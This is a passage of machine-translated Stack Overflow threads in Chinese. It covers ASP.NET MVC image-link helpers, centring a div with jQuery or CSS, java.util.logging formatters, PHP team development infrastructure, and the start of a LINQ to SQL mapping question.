        imglink.InnerHtml = htmlHelper.Image(imgSrc, imgHtmlAttributes) + " " + additionalText;
        linkHtmlAttributes = new RouteValueDictionary(linkHtmlAttributes);
        imglink.MergeAttributes((IDictionary<string, object>)linkHtmlAttributes, true);

        return MvcHtmlString.Create(imglink.ToString());
    }

    public static MvcHtmlString Image(this HtmlHelper htmlHelper, string imgSrc, object imgHtmlAttributes = null)
    {
        var imgTag = new TagBuilder("img");
        imgTag.MergeAttribute("src", imgSrc);
        if (imgHtmlAttributes != null)
        {
            imgHtmlAttributes = new RouteValueDictionary(imgHtmlAttributes);
            imgTag.MergeAttributes((IDictionary<string, object>)imgHtmlAttributes, true);
        }
        return MvcHtmlString.Create(imgTag.ToString());
    }
} 
```

希望这有帮助。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-06-17T16:44:09.243

Url.Content() 是您要查找的内容吗？

给它类似 Url.Content("~/path/to/something.jpg") 它会根据应用程序根目录将其转换为适当的路径。

-乔什

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2012-07-09T12:08:49.647

我接受了上述答案并做了一些包装扩展：

```
 public static MvcHtmlString ActionImageLink(this HtmlHelper helper, string src, string altText, UrlHelper url, string actionName, string controllerName)
        {
            return ActionImageLink(helper, src, altText, url, actionName, controllerName, null, null);
        }

        public static MvcHtmlString ActionImageLink(this HtmlHelper helper, string src, string altText, UrlHelper url, string actionName, string controllerName, Dictionary<string, string> linkAttributes, Dictionary<string, string> imageAttributes)
        {
            return ActionImageLink(helper, src, altText, url, actionName, controllerName, null, linkAttributes, imageAttributes);
        }

        public static MvcHtmlString ActionImageLink(this HtmlHelper helper, string src, string altText, UrlHelper url, string actionName, string controllerName, dynamic routeValues, Dictionary<string, string> linkAttributes, Dictionary<string, string> imageAttributes)
        {
            var linkBuilder = new TagBuilder("a");
            linkBuilder.MergeAttribute("href", routeValues == null ? url.Action(actionName, controllerName) : url.Action(actionName, controllerName, routeValues));

            var imageBuilder = new TagBuilder("img");
            imageBuilder.MergeAttribute("src", url.Content(src));
            imageBuilder.MergeAttribute("alt", altText);

            if (linkAttributes != null)
            {
                foreach (KeyValuePair<string, string> attribute in linkAttributes)
                {
                    if (!string.IsNullOrWhiteSpace(attribute.Key) && !string.IsNullOrWhiteSpace(attribute.Value))
                    {
                        linkBuilder.MergeAttribute(attribute.Key, attribute.Value);
                    }
                }
            }

            if (imageAttributes != null)
            {
                foreach (KeyValuePair<string, string> attribute in imageAttributes)
                {
                    if (!string.IsNullOrWhiteSpace(attribute.Key) && !string.IsNullOrWhiteSpace(attribute.Value))
                    {
                        imageBuilder.MergeAttribute(attribute.Key, attribute.Value);
                    }
                }
            }

            linkBuilder.InnerHtml = MvcHtmlString.Create(imageBuilder.ToString(TagRenderMode.SelfClosing)).ToString();
            return MvcHtmlString.Create(linkBuilder.ToString());
        } 
```

无论如何，这对我来说更容易，希望它可以帮助别人。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2011-01-08T13:13:31.710

我试图将 Html.Image 的输出**放入**我的**Html.ImageLink**助手中。

```
@(new HtmlString(Html.ActionLink(Html.Image("image.gif").ToString(), "myAction", "MyController").ToString().Replace("&lt;", "<").Replace("&gt;", ">"))) 
```

对我来说问题是，ActionLink 名称是编码的，所以我有 < 而不是 <。

我刚刚删除了这个编码，结果对我有用。（有没有更好的方法来代替使用替换？）

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2012-07-17T11:06:18.930

添加到其他帖子：在我的情况下（asp.net mvc 3）我想要一个图像链接作为语言选择器，所以我最终得到：

```
 public static MvcHtmlString ImageLink(this HtmlHelper htmlHelper, string imgSrc, string cultureName, object htmlAttributes, object imgHtmlAttributes, string languageRouteName = "lang", bool strictSelected = false)
        {
           UrlHelper urlHelper = ((Controller)htmlHelper.ViewContext.Controller).Url;
           TagBuilder imgTag = new TagBuilder("img");
           imgTag.MergeAttribute("src", imgSrc);
           imgTag.MergeAttributes((IDictionary<string, string>)imgHtmlAttributes, true);

           var language = htmlHelper.LanguageUrl(cultureName, languageRouteName, strictSelected);                      
           string url = language.Url;

           TagBuilder imglink = new TagBuilder("a");
           imglink.MergeAttribute("href", url);
           imglink.InnerHtml = imgTag.ToString();
           imglink.MergeAttributes((IDictionary<string, string>)htmlAttributes, true);

           //if the current page already contains the language parameter make sure the corresponding html element is marked
           string currentLanguage = htmlHelper.ViewContext.RouteData.GetRequiredString("lang");
           if (cultureName.Equals(currentLanguage, StringComparison.InvariantCultureIgnoreCase))
           {
              imglink.AddCssClass("selectedLanguage");
           }
           return new MvcHtmlString(imglink.ToString());
        } 
```

内部化支持是通过语言路径完成的——[这里](http://geekswithblogs.net/shaunxu/archive/2010/05/06/localization-in-asp.net-mvc-ndash-3-days-investigation-1-day.aspx)的原始源。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2013-10-10T17:40:13.960

这里有很好的解决方案，但是如果你想在 actionlink 中拥有更多的图像呢？我就是这样做的：

```
 @using (Html.BeginForm("Action", "Controler", ajaxOptions))
     { 
        <button type="submit">
           <img src="image.png" />            
        </button>
     } 
```

缺点是我仍然需要对按钮元素进行一些样式设置，但是您可以将所有想要的 html 放在那里。

它也适用于 Ajax 助手：[https ://stackoverflow.com/a/19302438/961139](https://stackoverflow.com/a/19302438/961139)

# javascript - 使用 jQuery 使 DIV 在屏幕上居中

> ID：210717
> 
> 赞同：782
> 
> 时间：2008-10-17T00:11:48.393
> 
> 标签：javascript, jquery, html, css, layout

如何`<div>`使用 jQuery 在屏幕中央设置 a？

* * *

## 回答 #1

> 赞同：1079
> 
> 时间：2008-10-17T00:22:07.140

我喜欢向 jQuery 添加函数，所以这个函数会有所帮助：

```
jQuery.fn.center = function () {
    this.css("position","absolute");
    this.css("top", Math.max(0, (($(window).height() - $(this).outerHeight()) / 2) + 
                                                $(window).scrollTop()) + "px");
    this.css("left", Math.max(0, (($(window).width() - $(this).outerWidth()) / 2) + 
                                                $(window).scrollLeft()) + "px");
    return this;
} 
```

现在我们可以写：

```
$(element).center(); 
```

演示：[小提琴](http://jsfiddle.net/DerekL/GbDw9/)（添加参数）

* * *

## 回答 #2

> 赞同：148
> 
> 时间：2010-02-13T13:21:46.077

我在这里放了一个[jquery插件](http://plugins.jquery.com/project/autocenter)

非常简短的版本

```
$('#myDiv').css({top:'50%',left:'50%',margin:'-'+($('#myDiv').height() / 2)+'px 0 0 -'+($('#myDiv').width() / 2)+'px'}); 
```

简洁版本

```
(function($){
    $.fn.extend({
        center: function () {
            return this.each(function() {
                var top = ($(window).height() - $(this).outerHeight()) / 2;
                var left = ($(window).width() - $(this).outerWidth()) / 2;
                $(this).css({position:'absolute', margin:0, top: (top > 0 ? top : 0)+'px', left: (left > 0 ? left : 0)+'px'});
            });
        }
    }); 
})(jQuery); 
```

由此代码激活：

```
$('#mainDiv').center(); 
```

插件版本

```
(function($){
     $.fn.extend({
          center: function (options) {
               var options =  $.extend({ // Default values
                    inside:window, // element, center into window
                    transition: 0, // millisecond, transition time
                    minX:0, // pixel, minimum left element value
                    minY:0, // pixel, minimum top element value
                    withScrolling:true, // booleen, take care of the scrollbar (scrollTop)
                    vertical:true, // booleen, center vertical
                    horizontal:true // booleen, center horizontal
               }, options);
               return this.each(function() {
                    var props = {position:'absolute'};
                    if (options.vertical) {
                         var top = ($(options.inside).height() - $(this).outerHeight()) / 2;
                         if (options.withScrolling) top += $(options.inside).scrollTop() || 0;
                         top = (top > options.minY ? top : options.minY);
                         $.extend(props, {top: top+'px'});
                    }
                    if (options.horizontal) {
                          var left = ($(options.inside).width() - $(this).outerWidth()) / 2;
                          if (options.withScrolling) left += $(options.inside).scrollLeft() || 0;
                          left = (left > options.minX ? left : options.minX);
                          $.extend(props, {left: left+'px'});
                    }
                    if (options.transition > 0) $(this).animate(props, options.transition);
                    else $(this).css(props);
                    return $(this);
               });
          }
     });
})(jQuery); 
```

由此代码激活：

```
$(document).ready(function(){
    $('#mainDiv').center();
    $(window).bind('resize', function() {
        $('#mainDiv').center({transition:300});
    });
); 
```

是对的吗 ？

# 更新 ：

来自[CSS 技巧](http://css-tricks.com/centering-percentage-widthheight-elements/)

```
.center {
  position: absolute;
  left: 50%;
  top: 50%;
  transform: translate(-50%, -50%); /* Yep! */
  width: 48%;
  height: 59%;
} 
```

* * *

## 回答 #3

> 赞同：63
> 
> 时间：2010-12-10T11:08:42.703

我会推荐[jQueryUI Position 实用程序](http://jqueryui.com/demos/position/)

```
$('your-selector').position({
    of: $(window)
}); 
```

这为您提供了比仅居中更多的可能性...

* * *

## 回答 #4

> 赞同：40
> 
> 时间：2012-01-22T08:24:31.007

这是我的尝试。我最终将它用于我的 Lightbox 克隆。此解决方案的主要优点是即使调整窗口大小，元素也会自动保持居中，使其非常适合这种用途。

```
$.fn.center = function() {
    this.css({
        'position': 'fixed',
        'left': '50%',
        'top': '50%'
    });
    this.css({
        'margin-left': -this.outerWidth() / 2 + 'px',
        'margin-top': -this.outerHeight() / 2 + 'px'
    });

    return this;
} 
```

* * *

## 回答 #5

> 赞同：27
> 
> 时间：2013-06-28T15:16:54.330

您可以单独使用 CSS 来居中，如下所示：

**[工作示例](http://jsfiddle.net/apaul34208/e4y6F/)**

```
.center{
    position: absolute;
    height: 50px;
    width: 50px;
    background:red;
    top:calc(50% - 50px/2); /* height divided by 2*/
    left:calc(50% - 50px/2); /* width divided by 2*/
}
```

```
<div class="center"></div>
```

`calc()`允许您在 css 中进行基本计算。

[`calc()`](https://developer.mozilla.org/en-US/docs/Web/CSS/calc)[浏览器支持表](http://caniuse.com/#feat=calc)[的 MDN 文档](https://developer.mozilla.org/en-US/docs/Web/CSS/calc)

* * *

## 回答 #6

> 赞同：15
> 
> 时间：2012-04-23T06:32:36.000

我正在扩展@TonyL 给出的好答案。我正在添加 Math.abs() 来包装这些值，并且我还考虑到 jQuery 可能处于“无冲突”模式，例如在 WordPress 中。

我建议您使用 Math.abs() 包装顶部和左侧的值，如下所示。如果窗口太小，而你的模态对话框顶部有一个关闭框，这将防止看不到关闭框的问题。Tony 的函数可能具有负值。关于如何最终得到负值的一个很好的例子是，如果你有一个大的居中对话框，但最终用户已经安装了几个工具栏和/或增加了他的默认字体——在这种情况下，模式对话框上的关闭框（如果在顶部）可能不可见且不可点击。

我做的另一件事是通过缓存 $(window) 对象来加快速度，这样我就可以减少额外的 DOM 遍历，并且我使用集群 CSS。

```
jQuery.fn.center = function ($) {
  var w = $(window);
  this.css({
    'position':'absolute',
    'top':Math.abs(((w.height() - this.outerHeight()) / 2) + w.scrollTop()),
    'left':Math.abs(((w.width() - this.outerWidth()) / 2) + w.scrollLeft())
  });
  return this;
} 
```

要使用，您可以执行以下操作：

```
jQuery(document).ready(function($){
  $('#myelem').center();
}); 
```

* * *

## 回答 #7

> 赞同：12
> 
> 时间：2014-07-31T09:37:48.030

我会使用**[jQuery UI](http://api.jqueryui.com/position/)** `position`函数。

**[请参阅工作演示](http://jsfiddle.net/ADm97/1/)**。

```
<div id="test" style="position:absolute;background-color:blue;color:white">
    test div to center in window
</div> 
```

如果我有一个 id 为“test”的 div 居中，那么下面的脚本将在文档准备好的窗口中将 div 居中。（位置选项中“my”和“at”的默认值为“center”）

```
<script type="text/javascript">
$(function(){
  $("#test").position({
     of: $(window)
  });
};
</script> 
```

* * *

## 回答 #8

> 赞同：9
> 
> 时间：2011-03-08T18:27:11.470

我想纠正一个问题。

```
this.css("top", ( $(window).height() - this.height() ) / 2+$(window).scrollTop() + "px"); 
```

上面的代码在以下情况下不起作用`this.height`（假设用户调整屏幕大小并且内容是动态的）并且`scrollTop() = 0`，例如：

`window.height`是`600`
`this.height`是`650`

```
600 - 650 = -50  

-50 / 2 = -25 
```

现在盒子在`-25`屏幕外居中。

* * *

## 回答 #9

> 赞同：7
> 
> 时间：2008-10-17T03:45:39.163

这是未经测试的，但这样的事情应该可以工作。

```
var myElement = $('#myElement');
myElement.css({
    position: 'absolute',
    left: '50%',
    'margin-left': 0 - (myElement.width() / 2)
}); 
```

* * *

## 回答 #10

> 赞同：6
> 
> 时间：2010-07-03T09:25:23.600

如果您希望元素始终位于页面中间，我认为拥有绝对位置并不是最好的选择。你可能想要一个固定的元素。我找到了另一个使用固定定位的 jquery 居中插件。称为[定心](http://david-tang.net/2010/06/fixed-center-plugin/)。

* * *

## 回答 #11

> 赞同：5
> 
> 时间：2012-03-18T13:06:32.517

## 编辑：

如果这个问题教会了我什么，那就是：不要改变已经有效的东西:)

我在[http://www.jakpsatweb.cz/css/css-vertical-center-solution.html](http://www.jakpsatweb.cz/css/css-vertical-center-solution.html)上提供了一个（几乎）逐字记录的副本- 它在 IE 上被大量黑客攻击，但提供了一种纯 CSS 方式回答问题：

```
.container {display:table; height:100%; position:absolute; overflow:hidden; width:100%;}
.helper    {#position:absolute; #top:50%;
            display:table-cell; vertical-align:middle;}
.content   {#position:relative; #top:-50%;
            margin:0 auto; width:200px; border:1px solid orange;} 
```

小提琴：http: [//jsfiddle.net/S9upd/4/](http://jsfiddle.net/S9upd/4/)

我已经通过 browsershots 运行了它，看起来还不错；如果没有别的原因，我将保留原件，以便 CSS 规范所规定的边距百分比处理得以实现。

## 原来的：

看来我迟到了！

上面有一些评论表明这是一个 CSS 问题 - 关注点分离和所有问题。让我先说 CSS*确实*在这个问题上打了自己的脚。我的意思是，这样做有多容易：

```
.container {
    position:absolute;
    left: 50%;
    top: 50%;
    overflow:visible;
}
.content {
    position:relative;
    margin:-50% 50% 50% -50%;
} 
```

对？Container 的左上角将位于屏幕的中心，并且带有负边距的内容将神奇地重新出现在页面的绝对中心！[http://jsfiddle.net/rJPPc/](http://jsfiddle.net/rJPPc/)

***错误的！***水平定位是可以的，但垂直定位......哦，我明白了。显然在 css 中，当以 % 设置上边距时，该值[总是以相对于包含块的](https://developer.mozilla.org/en/CSS/margin-top)[**宽度**](https://developer.mozilla.org/en/CSS/margin-top)[的百分比](https://developer.mozilla.org/en/CSS/margin-top)**计算。像苹果和橘子！如果您不信任我或 Mozilla doco，请通过调整内容宽度来玩弄上面的小提琴并感到惊讶。**

 *** * *

现在，CSS 是我的生计，我不会放弃。同时，我更喜欢简单的事情，所以我借用了[捷克 CSS 大师](http://www.jakpsatweb.cz/css/css-vertical-center-solution.html)的发现并将其变成了一个工作小提琴。长话短说，我们创建了一个表格，其中vertical-align 设置为middle：

```
<table class="super-centered"><tr><td>
    <div class="content">
        <p>I am centered like a boss!</p>
    </div>
</td></tr></table> 
```

并且内容的位置用良好的旧边距进行了微调**：0 auto;** ：

```
.super-centered {position:absolute; width:100%;height:100%;vertical-align:middle;}
.content {margin:0 auto;width:200px;}​ 
```

按承诺工作小提琴：http: [//jsfiddle.net/teDQ2/](http://jsfiddle.net/teDQ2/)

* * *

## 回答 #12

> 赞同：4
> 
> 时间：2010-03-31T12:41:22.003

这个函数的转换组件在 Chrome 中对我来说效果很差（没有在其他地方测试过）。我会调整窗口的大小，然后我的元素会慢慢地四处移动，试图赶上。

因此，以下函数注释了该部分。此外，我添加了用于传入可选 x 和 y 布尔值的参数，如果你想垂直居中而不是水平居中，例如：

```
// Center an element on the screen
(function($){
  $.fn.extend({
    center: function (x,y) {
      // var options =  $.extend({transition:300, minX:0, minY:0}, options);
      return this.each(function() {
                if (x == undefined) {
                    x = true;
                }
                if (y == undefined) {
                    y = true;
                }
                var $this = $(this);
                var $window = $(window);
                $this.css({
                    position: "absolute",
                });
                if (x) {
                    var left = ($window.width() - $this.outerWidth())/2+$window.scrollLeft();
                    $this.css('left',left)
                }
                if (!y == false) {
            var top = ($window.height() - $this.outerHeight())/2+$window.scrollTop();   
                    $this.css('top',top);
                }
        // $(this).animate({
        //   top: (top > options.minY ? top : options.minY)+'px',
        //   left: (left > options.minX ? left : options.minX)+'px'
        // }, options.transition);
        return $(this);
      });
    }
  });
})(jQuery); 
```

* * *

## 回答 #13

> 赞同：4
> 
> 时间：2011-04-20T18:21:33.057

这很棒。我添加了一个回调函数

```
center: function (options, callback) { 
```

```
if (options.transition > 0) {
   $(this).animate(props, options.transition, callback);
} else { 
    $(this).css(props);
   if (typeof callback == 'function') { // make sure the callback is a function
       callback.call(this); // brings the scope to the callback
   }
} 
```

* * *

## 回答 #14

> 赞同：4
> 
> 时间：2012-06-06T16:57:17.947

要将元素相对于浏览器视口（窗口）居中，不要使用`position: absolute`，正确的位置值应该是`fixed`（绝对意味着：“元素相对于其第一个定位（非静态）祖先元素定位”）。

建议的中心插件的这个替代版本使用“%”而不是“px”，因此当您调整窗口大小时，内容保持居中：

```
$.fn.center = function () {
    var heightRatio = ($(window).height() != 0) 
            ? this.outerHeight() / $(window).height() : 1;
    var widthRatio = ($(window).width() != 0) 
            ? this.outerWidth() / $(window).width() : 1;

    this.css({
        position: 'fixed',
        margin: 0,
        top: (50*(1-heightRatio)) + "%",
        left: (50*(1-widthRatio))  + "%"
    });

    return this;
} 
```

您需要将`margin: 0`内容边距从宽度/高度中排除（因为我们使用的是固定位置，所以有边距没有意义）。根据 jQuery doc using`.outerWidth(true)`应该包括边距，但是当我在 Chrome 中尝试时它没有按预期工作。

来自`50*(1-ratio)`：

窗口宽度：`W = 100%`

元素宽度（%）：`w = 100 * elementWidthInPixels/windowWidthInPixels`

他们计算居中的左边：

```
 left = W/2 - w/2 = 50 - 50 * elementWidthInPixels/windowWidthInPixels =
 = 50 * (1-elementWidthInPixels/windowWidthInPixels) 
```

* * *

## 回答 #15

> 赞同：3
> 
> 时间：2013-08-14T13:09:19.497

我这里有一个“中心”方法，可确保您尝试居中的元素不仅是“固定”或“绝对”定位，而且还确保您居中的元素小于其父元素，这个居中并且相对于的元素是父元素，如果元素的父元素小于元素本身，它将掠夺 DOM 到下一个父元素，并将其相对于该元素居中。

```
$.fn.center = function () {
        /// <summary>Centers a Fixed or Absolute positioned element relative to its parent</summary>

        var element = $(this),
            elementPos = element.css('position'),
            elementParent = $(element.parent()),
            elementWidth = element.outerWidth(),
            parentWidth = elementParent.width();

        if (parentWidth <= elementWidth) {
            elementParent = $(elementParent.parent());
            parentWidth = elementParent.width();
        }

        if (elementPos === "absolute" || elementPos === "fixed") {
            element.css('right', (parentWidth / 2) - elementWidth / 2 + 'px');
        }
    }; 
```

* * *

## 回答 #16

> 赞同：3
> 
> 时间：2018-03-15T18:21:23.143

**CSS 解决方案** **仅两行**

它水平和垂直集中你的内部 div。

```
#outer{
  display: flex;
}
#inner{
  margin: auto;
} 
```

仅用于水平对齐，更改

```
margin: 0 auto; 
```

对于垂直，改变

```
margin: auto 0; 
```

* * *

## 回答 #17

> 赞同：2
> 
> 时间：2015-11-01T12:07:15.437

我用这个：

```
$(function() {
   $('#divId').css({
    'left' : '50%',
    'top' : '50%',
    'position' : 'absolute',
    'margin-left' : -$('#divId').outerWidth()/2,
    'margin-top' : -$('#divId').outerHeight()/2
  });
}); 
```

* * *

## 回答 #18

> 赞同：2
> 
> 时间：2016-03-19T21:00:30.620

请使用这个：

```
$(window).resize(function(){
    $('.className').css({
        position:'absolute',
        left: ($(window).width() - $('.className').outerWidth())/2,
        top: ($(window).height() - $('.className').outerHeight())/2
    });
});

// To initially run the function:
$(window).resize(); 
```

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2010-07-07T18:17:19.670

您的过渡效果不佳，因为每次滚动文档时您都在调整元素的位置。您想要的是使用固定定位。我尝试了上面列出的固定中心插件，这似乎很好地解决了这个问题。固定定位允许您将元素居中一次，并且 CSS 属性会在您每次滚动时为您维护该位置。

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2012-06-04T04:28:22.033

这是我的版本。在我查看这些示例后，我可能会更改它。

```
$.fn.pixels = function(property){
    return parseInt(this.css(property));
};

$.fn.center = function(){
    var w = $($w);
    return this.each(function(){
        $(this).css("position","absolute");
        $(this).css("top",((w.height() - $(this).height()) / 2) - (($(this).pixels('padding-top') + $(this).pixels('padding-bottom')) / 2) + w.scrollTop() + "px");
        $(this).css("left",((w.width() - $(this).width()) / 2) - (($(this).pixels('padding-left') + $(this).pixels('padding-right')) / 2) + w.scrollLeft() + "px");
    });
}; 
```

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2013-10-17T10:21:24.507

不需要jquery

我用它来居中 Div 元素。CSS样式，

```
.black_overlay{
    display: none;
    position: absolute;
    top: 0%;
    left: 0%;
    width: 100%;
    height: 100%;
    background-color: black;
    z-index:1001;
    -moz-opacity: 0.8;
    opacity:.80;
    filter: alpha(opacity=80);
}

.white_content {
    display: none;
    position: absolute;
    top: 25%;
    left: 25%;
    width: 50%;
    height: 50%;
    padding: 16px;
    border: 16px solid orange;
    background-color: white;
    z-index:1002;
    overflow: auto;
} 
```

开放元素

```
$(document).ready(function(){
    $(".open").click(function(e){
      $(".black_overlay").fadeIn(200);
    });

}); 
```

* * *

## 回答 #22

> 赞同：0
> 
> 时间：2014-07-30T15:46:47.650

您可以使用 CSS`translate`属性：

```
position: absolute;
transform: translate(-50%, -50%); 
```

阅读[这篇文章](http://blog.netgloo.com/2014/07/30/centering-a-div-with-css-without-negative-margin-or-jquery/)了解更多详情。

* * *

## 回答 #23

> 赞同：0
> 
> 时间：2015-07-23T15:31:33.097

**我对 TONY L'S ANSWER 的更新** 这是我现在虔诚地使用的他的答案的修改版本。我想我会分享它，因为它为您可能遇到的各种情况添加了更多功能，例如不同类型的`position`或只想要水平/垂直居中而不是两者。

中心.js：

```
// We add a pos parameter so we can specify which position type we want

// Center it both horizontally and vertically (dead center)
jQuery.fn.center = function (pos) {
    this.css("position", pos);
    this.css("top", ($(window).height() / 2) - (this.outerHeight() / 2));
    this.css("left", ($(window).width() / 2) - (this.outerWidth() / 2));
    return this;
}

// Center it horizontally only
jQuery.fn.centerHor = function (pos) {
    this.css("position", pos);
    this.css("left", ($(window).width() / 2) - (this.outerWidth() / 2));
    return this;
}

// Center it vertically only
jQuery.fn.centerVer = function (pos) {
    this.css("position", pos);
    this.css("top", ($(window).height() / 2) - (this.outerHeight() / 2));
    return this;
} 
```

在我的`<head>`：

```
<script src="scripts/center.js"></script> 
```

使用示例：

```
$("#example1").centerHor("absolute")
$("#example2").centerHor("fixed")

$("#example3").centerVer("absolute")
$("#example4").centerVer("fixed")

$("#example5").center("absolute")
$("#example6").center("fixed") 
```

它适用于任何定位类型，并且可以轻松地在您的整个站点中使用，并且可以轻松地移植到您创建的任何其他站点。没有更多烦人的解决方法来正确居中。

希望这对那里的人有用！享受。

* * *

## 回答 #24

> 赞同：0
> 
> 时间：2015-09-30T23:15:55.200

有很多方法可以做到这一点。**我的对象被display:none**隐藏在 BODY 标签内，因此定位是相对于 BODY 的。使用**$("#object_id").show()**后，我调用**$("#object_id").center()**

我使用**position:absolute**是因为有可能，特别是在小型移动设备上，模态窗口大于设备窗口，在这种情况下，如果定位是固定的，则某些模态内容可能无法访问。

这是基于其他人的答案和我的具体需求的我的口味：

```
$.fn.center = function () {
        this.css("position","absolute");

        //use % so that modal window will adjust with browser resizing
        this.css("top","50%");
        this.css("left","50%");

        //use negative margin to center
        this.css("margin-left",(-1*this.outerWidth()/2)+($(window).scrollLeft())+"px");
        this.css("margin-top",(-1*this.outerHeight()/2)+($(window).scrollTop())+"px");

        //catch cases where object would be offscreen
        if(this.offset().top<0)this.css({"top":"5px","margin-top":"0"});
        if(this.offset().left<0)this.css({"left":"5px","margin-left":"0"});

        return this;
    }; 
```

* * *

## 回答 #25

> 赞同：0
> 
> 时间：2016-03-16T16:27:02.460

通常，我只会用 CSS 来做这件事......但是既然你问过你用 jQuery 做这个的方法......

以下代码将 div 在其容器内水平和垂直居中：

```
$("#target").addClass("centered-content")
            .wrap("<div class='center-outer-container'></div>")
            .wrap("<div class='center-inner-container'></div>");
```

```
body {
    margin : 0;
    background: #ccc;
}

.center-outer-container {
    position : absolute;
    display: table;
    width: 100%;
    height: 100%;
}

.center-inner-container {
    display: table-cell;
    vertical-align: middle;
    text-align: center;
}

.centered-content {
    display: inline-block;
    text-align: left;
    background: #fff;
    padding : 20px;
    border : 1px solid #000;
}
```

```
<script type="text/javascript" src="https://code.jquery.com/jquery-1.12.1.min.js"></script>
<div id="target">Center this!</div>
```

（另见[**这个小提琴**](https://jsfiddle.net/3k1ts96b/1/)）

* * *

## 回答 #26

> 赞同：0
> 
> 时间：2020-01-14T08:13:56.977

就说： $("#divID").html($('').html($("#divID").html()));

* * *

## 回答 #27

> 赞同：0
> 
> 时间：2020-09-23T14:40:26.493

它只能用**CSS**来完成。但他们用**jQuery 或 JavaScript询问**

在这里，使用**[`CSS Flex box`](https://css-tricks.com/snippets/css/a-guide-to-flexbox/)**属性来对齐 div 中心。

```
body.center{
  display:flex;
  align-items:center; // Vertical alignment
  justify-content:center; // Horizontal alignment
} 
```

> **[对齐项目：中心；](https://developer.mozilla.org/en-US/docs/Web/CSS/align-items)**- 用于垂直对齐。

> **[证明内容：中心；](https://developer.mozilla.org/en-US/docs/Web/CSS/justify-content)**- 用于水平对齐。

```
document.querySelector("body").classList.add("center");
```

```
body {
  margin : 0;
  height:100vh;
  width:100%;
  background: #ccc;
}
#main{
  background:#00cc00;
  width:100px;
  height:100px;
}
body.center{
  display:flex;
  align-items:center;
  justify-content:center;
}
```

```
<body>
  <div id="main"></div>
</body>
```

* * *

## 回答 #28

> 赞同：-7
> 
> 时间：2011-05-30T11:35:58.493

为什么不使用 CSS 使 div 居中？

```
#timer_wrap{  
  position: fixed;
  left: 50%;
  top: 50%;
} 
```

# java - 您可以覆盖 log.properties 中特定日志的格式化程序吗

> ID：210719
> 
> 赞同：0
> 
> 时间：2008-10-17T00:12:38.173
> 
> 标签：java, configuration, logging

我正在使用 log.properties 为 Java 应用程序配置日志记录。每个类都有自己的以自己命名的记录器（例如 com.company.program.ClassX）。

我想为一个日志设置一个自定义格式化程序，并将处理程序留给 SimpleFormatter。这可能吗？

我对使用 log4j 或其他日志套件不感兴趣。我很了解他们。我也没有兴趣通过代码为记录器配置客户格式化程序，尽管如果这是唯一的方法，很高兴知道。谷歌没有帮助，我自己测试时遇到了问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-22T00:50:45.740

[Handler](http://java.sun.com/javase/6/docs/api/java/util/logging/Handler.html)拥有 Formatter，而不是 Logger 。您将需要第二个处理程序来执行特殊格式。我假设您希望两者都出现在控制台中，因此答案似乎是“否”。

尝试：创建 java.util.logging.ConsoleHandler 的子类并将其用作第二个控制台处理程序。（我在这里假设您正在使用[系统属性](http://edocs.bea.com/kodo/docs303/ref_guide_logging_jdk14.html)，否则它不会帮助您。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-17T16:06:18.107

我相信这是 Java 日志记录的限制。

您应该决定对 log4j 感兴趣。java.util.logging 仅略好于`System.out.println`

# database - 专业 PHP 团队开发环境的样板

> ID：210721
> 
> 赞同：4
> 
> 时间：2008-10-17T00:12:55.223
> 
> 标签：database, svn, lamp

我想对最小/样板的专业 PHP 团队开发环境达成普遍共识。我在网上的任何地方都找不到这些信息。在开源世界中，有很多选择和做事的方法很多，但我还没有找到任何适用于基础设施/管道方面的通用最佳实践。

考虑一个拥有 5-10 名开发人员/设计师团队的小商店，他们正在开发 LAMP CRUD 应用程序。他们需要管理开发、登台和生产构建。他们想要高质量的软件，而且他们不能互相踩着脚趾试图把事情做好。部署需要简单快速。有时会有修补程序。将生产服务器回滚到以前的版本需要同样快。

需要考虑的事情是：

*   源代码管理（SVN、git、Hg）

*   数据库模式/数据持续集成，与源代码修订相关。这是我特别感兴趣的一个。

*   单独的开发环境（例如，每个开发人员都有一个开发环境的 VMware 实例来修补（数据库服务器、Web 服务器、代码、数据等））

*   管理中央开发、登台和生产构建

*   生产部署（例如 tar 球、.rpm/.deb）

*   自动化测试（例如 SVN 提交挂钩、用于较慢测试的夜间 cron 测试）

*   团队沟通（错误跟踪、内部文档、irc/im 等）

我已将此开放给社区编辑，因此请随时编辑/添加。理想情况下，有人可以访问此页面，几个小时后，他们的团队就可以开始开发了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-17T00:45:28.433

我会开始的。**随时编辑和改进**

这是一个虚构的产品，名为：dundermifflin.com

1.  设置一个开发虚拟机，运行您计划在生产中使用的相同软件：例如带有 PostgreSQL、Apache 和 PHP5 的 Ubuntu。

2.  每个开发人员运行他们自己的虚拟机副本，主机名设置为他们的用户名，（例如 phpguy.dundermifflin.com）

3.  设置中央登台服务器（与开发 VM 相同）。这是 staging.dundermifflin.com。

4.  为 dundermifflin.com 设置一个带有新存储库的中央 Subversion 服务器。这是 devel.dundermifflin.com。

    *   4a。添加提交后挂钩以运行“主干”提交的测试
    *   4b。将提交后挂钩添加到打包/部署到登台服务器以进行标记为“登台”的提交
    *   4c。添加提交后挂钩以打包/部署到生产服务器以进行标记为“发布”的提交

此方法不涉及数据库持续集成，这意味着将 SVN 回滚到以前的版本会破坏构建，除非您的数据库非常静态。建议？

5.  使用中央 Subversion 服务器 (devel.dundermifflin.com) 上的 Bugzilla 进行错误跟踪。

6.  编写一个 shell 脚本来运行 PHPUnit/SimpleTest 测试（由项目 4a 调用）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-20T01:30:33.287

对于持续集成，与您的版本控制系统相关联，以及自动化单元测试，我觉得这篇文章非常有趣：

[使用 CruiseControl、Ant 和 PHPUnit 持续构建](http://nohn.net/blog/view/id/cruisecontrol_ant_and_phpunit)

# c# - LINQ to SQL DataContext.Translate 和名称与源不同的属性

> ID：210724
> 
> 赞同：6
> 
> 时间：2008-10-17T00:16:38.073
> 
> 标签：c#, .net, sql-server, linq-to-sql

我正在处理一些表，我希望 C# 类具有与基础表列不同的属性名称。但是，当我使用 Translate 方法读取结果时，与源名称不匹配的属性永远不会被填充。即使我使用 Linq 生成 SQL。

